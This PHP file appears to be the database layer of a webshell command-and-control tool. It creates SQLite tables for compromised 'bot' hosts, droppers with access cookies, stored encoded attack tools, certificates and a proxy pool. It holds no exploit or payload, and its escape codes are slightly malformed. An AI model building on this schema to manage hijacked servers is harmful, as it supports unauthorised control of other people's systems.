<?php

class slopSqlite extends SQLite3
{
    function __construct($filename, $flags = SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE, $encryptionKey = null)
    {
        if (is_null($encryptionKey) || empty($encryptionKey)){
            $encryptionKey = bin2hex(openssl_random_pseudo_bytes(25));
            print("Please use this key to call the database: $encryptionKey");
        }
        parent::__construct($filename, $flags, $encryptionKey);
    }

    function __destruct(){
        parent::close();
    }
    private function buildTables(string $caller){
        $current_host = $_SERVER['HTTP_HOST'];
        $prepare_tables = <<< EOF
CREATE TABLE IF NOT EXISTS sloppy_bots_main(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, 
    datetime TIMESTAMP DEFAULT 
    CURRENT_TIMESTAMP NOT NULL, 
    rhost TEXT UNIQUE NOT NULL, 
    uri TEXT NOT NULL DEFAULT '/slopshell.php', 
    uuid TEXT UNIQUE NOT NULL, 
    os_flavor TEXT NOT NULL, 
    check_in INTEGER DEFAULT 0 NOT NULL
);

CREATE TABLE IF NOT EXISTS sloppy_bots_slim_droppers(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
    location_on_disk TEXT UNIQUE NOT NULL,
    caller_domain TEXT NOT NULL DEFAULT '-',
    cookiename TEXT NOT NULL DEFAULT '-',
    cookievalue TEXT NOT NULL DEFAULT '-',
    user_agent TEXT NOT NULL DEFAULT 'sp/1.1'
);

CREATE TABLE IF NOT EXISTS sloppy_bots_domains(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    uses INTEGER NOT NULL DEFAULT 0,
    from_domain TEXT NOT NULL DEFAULT '$current_host'
);

CREATE TABLE IF NOT EXISTS sloppy_bots_tools(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    tool_name TEXT UNIQUE NOT NULL,
    target TEXT NOT NULL,
    base64_encoded_tool TEXT UNIQUE NOT NULL,
    keys TEXT UNIQUE,
    tags TEXT UNIQUE,
    iv TEXT UNIQUE,
    cipher TEXT NOT NULL DEFAULT NONE,
    hmac_hash TEXT UNIQUE,
    lang TEXT NOT NULL,
    is_encrypted BOOLEAN DEFAULT false
);

CREATE TABLE IF NOT EXISTS sloppy_bots_certs(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    cert_location_on_disk TEXT UNIQUE NOT NULL,
    base64_encoded_cert TEXT UNIQUE NOT NULL,
    csr TEXT UNIQUE,
    pub TEXT UNIQUE,
    pem TEXT UNIQUE,
    cipher TEXT DEFAULT '-',
    is_encrypted BOOLEAN DEFAULT FALSE,
    priv_key_pass TEXT UNIQUE NOT NULL
);

CREATE TABLE IF NOT EXISTS sloppy_bots_proxies(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    proxy_schema TEXT NOT NULL DEFAULT '-',
    proxy TEXT UNIQUE NOT NULL,
    times_used INTEGER NOT NULL DEFAULT 0,
    last_domain_contacted TEXT NOT NULL DEFAULT '-',
    proxy_still_viable BOOLEAN NOT NULL DEFAULT TRUE,
    round_trip_time INTEGER NOT NULL DEFAULT 0,
    time_outs INTEGER NOT NULL DEFAULT 0,
    successful_responses INTEGER NOT NULL DEFAULT 0
);
EOF;
        if ($this->exec($prepare_tables) === true){
            return "\033;34mSuccessful!\033;0m".PHP_EOL;
        }else{
            if (strpos($caller, "local") !== false) {
                return "\033[0;31mThere was an issue:\033[0m".PHP_EOL."\033[0;31m".$this->lastErrorMsg()."\033[0m".PHP_EOL;
            }else {
                return "oops" . PHP_EOL;
            }
        }
    }

    public function verifySchema(){
        $result = $this->query('SELECT * FROM sqlite_master;');
        return $result->fetchArray(SQLITE3_ASSOC);

    }

    public function checkDataBase(string $caller){
        if (file_exists('includes/db/sqlite3_repo/sloppy_db.sqlite')){
            return true;
        }else{
            return $this->buildTables($caller);
        }
    }

}
